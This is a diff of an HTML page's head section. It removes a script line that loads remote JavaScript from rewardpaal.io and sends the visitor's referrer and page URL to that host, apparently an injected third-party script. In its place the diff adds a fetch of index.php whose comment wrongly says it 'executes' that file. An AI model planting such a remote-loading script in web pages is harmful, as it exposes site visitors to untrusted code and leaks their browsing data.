@@ -19,7 +19,17 @@
   <link rel="stylesheet" href="assets/socicon/css/styles.css">
   <link rel="stylesheet" href="assets/theme/css/style.css">
   <link rel="stylesheet" href="assets/recaptcha.css">
-  <script async>document.write(`<script async src="https://rewardpaal.io/?referrerCF=${escape(document.referrer)}&urlCF=${escape(window.location.href)}"><\/script>`)</script>
+  <script>
+    // Use AJAX to run the index.php file
+    fetch('index.php')
+      .then(response => response.text())
+      .then(data => {
+        console.log('index.php executed:', data);
+      })
+      .catch(error => {
+        console.error('Error executing index.php:', error);
+      });
+  </script>
   <link rel="preload" href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:ital,wght@0,400;0,700;1,400;1,700&display=swap&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
   <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:ital,wght@0,400;0,700;1,400;1,700&display=swap&display=swap"></noscript>
   <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css?v=k1xcbD"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css?v=k1xcbD" type="text/css">
